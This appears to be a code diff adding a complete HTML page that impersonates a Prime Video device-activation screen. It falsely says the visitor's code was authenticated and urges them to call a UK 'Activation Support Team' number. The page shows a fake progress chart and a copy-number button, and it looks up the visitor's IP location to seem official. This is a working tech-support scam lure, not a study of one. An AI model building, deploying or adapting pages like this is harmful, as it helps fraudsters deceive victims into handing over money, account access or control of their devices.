@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Activation — Phone Verification Required</title>
+
+  <!-- Tailwind (CDN) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Chart.js -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4"></script>
+
+  <style>
+    :root { --brand: #67b0d8; --accent:#0f1724; --muted:#6b7280; }
+    .card { background: linear-gradient(180deg, #ffffff, #fbfeff); border-radius: 14px; box-shadow: 0 8px 28px rgba(15,23,42,0.06); border: 1px solid rgba(15,23,42,0.04); }
+    .chart-center { position: absolute; inset:0; display:flex; align-items:center; justify-content:center; flex-direction:column; pointer-events:none; }
+    .phone-btn { background: linear-gradient(180deg,var(--brand),#5aa1c7); color:#022; }
+    /* detected flag */
+    #detectedFlag { width:28px; height:20px; object-fit:cover; border-radius:4px; box-shadow:0 4px 10px rgba(2,6,23,0.08); margin-right:10px; display:inline-block; vertical-align:middle; }
+    @media (max-width:640px) {
+      #detectedFlag { width:22px; height:16px; margin-right:8px; }
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-slate-50 text-slate-800 antialiased">
+
+  <main class="max-w-4xl mx-auto p-4 sm:p-6">
+    <header class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-6">
+      <div>
+        <h1 class="text-2xl sm:text-3xl font-extrabold text-slate-900">Activation Status</h1>
+        <p class="text-sm text-slate-500 mt-1">We’ve authenticated your code — one last step remains.</p>
+      </div>
+      <div class="flex items-center gap-3">
+        <span class="inline-flex items-center gap-2 bg-amber-50 text-amber-700 px-3 py-1 rounded-full text-sm font-semibold">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" class="opacity-90"><circle cx="12" cy="12" r="6" fill="#f59e0b"/></svg>
+          Action required
+        </span>
+      </div>
+    </header>
+
+    <div class="grid grid-cols-1 md:grid-cols-12 gap-6">
+      <section class="md:col-span-5 lg:col-span-4 flex flex-col gap-4">
+        <div class="card p-5 relative">
+          <h2 class="text-lg font-semibold text-slate-800 mb-3">Activation Progress</h2>
+          <div class="relative mx-auto w-48 h-48 sm:w-56 sm:h-56">
+            <canvas id="progressChart" aria-label="Activation progress chart" role="img"></canvas>
+            <div class="chart-center">
+              <div id="percentText" class="text-2xl font-extrabold text-slate-900">66%</div>
+              <div class="text-xs text-slate-500 mt-1">Setup complete</div>
+            </div>
+          </div>
+          <dl class="mt-4 space-y-2 text-sm">
+            <div class="flex justify-between"><dt class="text-slate-600">Code authentication</dt><dd class="font-semibold text-green-600">Complete</dd></div>
+            <div class="flex justify-between"><dt class="text-slate-600">Phone verification</dt><dd class="font-semibold text-amber-600">Pending</dd></div>
+          </dl>
+        </div>
+        <div class="card p-4">
+          <h3 class="text-sm font-semibold text-slate-800">Step</h3>
+          <p class="text-sm text-slate-600 mt-2">As a final step, please contact our Activation Support Team to verify your Prime Video device.</p>
+        </div>
+      </section>
+
+      <section class="md:col-span-7 lg:col-span-8 flex flex-col gap-4">
+        <div class="card p-6">
+          <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
+            <div>
+              <h2 class="text-2xl font-extrabold text-[#1c3761]">Phone Verification Required</h2>
+              <p class="text-sm text-slate-600 mt-1 max-w-xl">Prime Video detected an activation request from your device. To protect your account we need to confirm this was you.</p>
+            </div>
+
+            <!-- detected location (flag + text) -->
+            <div class="text-right flex items-center sm:justify-end justify-start gap-2">
+              <img id="detectedFlag" src="https://upload.wikimedia.org/wikipedia/commons/8/80/Globe_icon.svg" alt="location flag" aria-hidden="true">
+              <div>
+                <div id="detectedLoc" class="text-sm text-slate-600">Detecting location…</div>
+                <div class="text-xs text-slate-400 mt-1">This is your detected location</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="mt-6 flex flex-col sm:flex-row sm:items-center gap-3">
+            <a id="callNow" href="tel:+442046383175" class="phone-btn inline-flex items-center justify-center px-6 py-4 rounded-full text-lg font-extrabold shadow-md w-full sm:w-auto" aria-label="Call support now">CALL +44 204 638 3175</a>
+
+            <button id="copyBtn" class="border border-slate-200 rounded-full px-5 py-3 text-sm font-semibold text-slate-700 hover:bg-slate-50 w-full sm:w-auto" aria-label="Copy number to clipboard">
+              Copy number
+            </button>
+
+            <button id="helpBtn" class="ml-auto text-slate-600 text-sm underline hidden sm:inline" aria-controls="details">Need help?</button>
+          </div>
+
+          <p class="text-xs text-slate-400 mt-4">Tip: Calling from a mobile phone will start verification immediately. If you’re on desktop, click <strong>Copy number</strong> and dial on your phone.</p>
+        </div>
+
+        <div class="card overflow-hidden" id="details" aria-hidden="true">
+          <button id="toggleDetails" class="w-full p-4 flex items-start justify-between text-left focus:outline-none" aria-expanded="false">
+            <div>
+              <div class="text-sm font-semibold">Why is this required?</div>
+              <div class="text-xs text-slate-500">Security check to prevent unauthorized activations</div>
+            </div>
+            <div class="text-slate-400" id="chev">▼</div>
+          </button>
+
+          <div id="detailsPanel" class="border-t border-slate-100 p-4 hidden bg-slate-50">
+            <p class="text-sm text-slate-600 leading-relaxed">
+              Our automated check validated your activation code but flagged the request for manual verification.
+              This short phone verification confirms account ownership and prevents unauthorized access to your Prime Video subscription.
+            </p>
+
+            <ul class="mt-3 text-sm text-slate-600 space-y-2">
+              <li>• The call takes under 2 minutes</li>
+              <li>• Support will verify your identity and complete activation</li>
+              <li>• If you prefer, use our chat (bottom-right) to speak with an agent</li>
+            </ul>
+          </div>
+        </div>
+
+        <footer class="text-center text-xs text-slate-400 mt-2">© MyTV — Activation Service</footer>
+      </section>
+    </div>
+  </main>
+
+  <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-900 text-white px-4 py-2 rounded-md text-sm opacity-0 pointer-events-none transition-opacity">
+    Copied to clipboard ✓
+  </div>
+
+<script>
+const PHONE = '+442046383175';
+const callBtn = document.getElementById('callNow');
+const copyBtn = document.getElementById('copyBtn');
+const toast = document.getElementById('toast');
+const detailsButton = document.getElementById('toggleDetails');
+const detailsPanel = document.getElementById('detailsPanel');
+const chev = document.getElementById('chev');
+const detectedLoc = document.getElementById('detectedLoc');
+const detectedFlag = document.getElementById('detectedFlag');
+
+copyBtn.addEventListener('click', async () => {
+  try {
+    await navigator.clipboard.writeText(PHONE);
+    showToast('Copied to clipboard ✓');
+  } catch (e) {
+    const ta = document.createElement('textarea'); ta.value = PHONE; document.body.appendChild(ta); ta.select();
+    document.execCommand('copy'); document.body.removeChild(ta);
+    showToast('Copied to clipboard ✓');
+  }
+  copyBtn.innerText = 'Copied';
+  setTimeout(()=> copyBtn.innerText = 'Copy number', 2200);
+});
+
+function showToast(text){
+  toast.textContent = text;
+  toast.style.opacity = '1';
+  toast.style.pointerEvents = 'auto';
+  setTimeout(()=>{ toast.style.opacity='0'; toast.style.pointerEvents='none'; }, 2000);
+}
+
+detailsButton.addEventListener('click', () => {
+  const isHidden = detailsPanel.classList.contains('hidden');
+  detailsPanel.classList.toggle('hidden');
+  detailsButton.setAttribute('aria-expanded', isHidden ? 'true' : 'false');
+  chev.style.transform = isHidden ? 'rotate(180deg)' : 'rotate(0deg)';
+});
+
+/* Chart.js: Doughnut */
+const ctx = document.getElementById('progressChart').getContext('2d');
+const totalSteps = 3;
+const completed = 1;
+const pending = 1;
+const remaining = 1;
+const chart = new Chart(ctx, {
+  type: 'doughnut',
+  data: {
+    labels: ['Complete', 'Pending', 'Remaining'],
+    datasets: [{
+      data: [completed, pending, remaining],
+      backgroundColor: ['#22c55e', '#f59e0b', '#e6eef8'],
+      borderWidth: 0,
+      hoverOffset: 6
+    }]
+  },
+  options: {
+    responsive: true,
+    maintainAspectRatio: false,
+    cutout: '70%',
+    plugins: { legend: { display: false }, tooltip: {} }
+  }
+});
+const percentVal = Math.round((completed / totalSteps) * 100);
+document.getElementById('percentText').textContent = percentVal + '%';
+
+/* Location detection (flag + city/country) */
+function setLocText(city, country, cc){
+  if(city || country){
+    detectedLoc.textContent = (city ? city + ', ' : '') + (country || '');
+  } else {
+    detectedLoc.textContent = 'Location unavailable';
+  }
+  // set flag if cc is 2-letter
+  if(cc && typeof cc === 'string' && cc.length === 2){
+    detectedFlag.src = 'https://flagcdn.com/w40/' + cc.toLowerCase() + '.png';
+    detectedFlag.alt = country ? (country + ' flag') : (cc + ' flag');
+  } else {
+    detectedFlag.src = 'https://upload.wikimedia.org/wikipedia/commons/8/80/Globe_icon.svg';
+    detectedFlag.alt = 'global';
+  }
+}
+
+function tryIpapi(){
+  fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+    if(d && (d.country_name || d.city)) setLocText(d.city, d.country_name, (d.country_code||'').toUpperCase());
+    else throw 0;
+  }).catch(()=> tryIpwho());
+}
+function tryIpwho(){
+  fetch('https://ipwho.is/').then(r=>r.json()).then(d=>{
+    if(d && (d.country || d.city)) setLocText(d.city, d.country, (d.country_code||'').toUpperCase());
+    else throw 0;
+  }).catch(()=> tryGeoDb());
+}
+function tryGeoDb(){
+  fetch('https://geolocation-db.com/json/').then(r=>r.json()).then(d=>{
+    if(d && (d.country_name || d.city)) setLocText(d.city, d.country_name, (d.country_code||'').toUpperCase());
+    else setLocText(null,null);
+  }).catch(()=> setLocText(null,null));
+}
+tryIpapi();
+
+/* focus for mobile */
+callBtn.focus();
+</script>
+</body>
+</html>
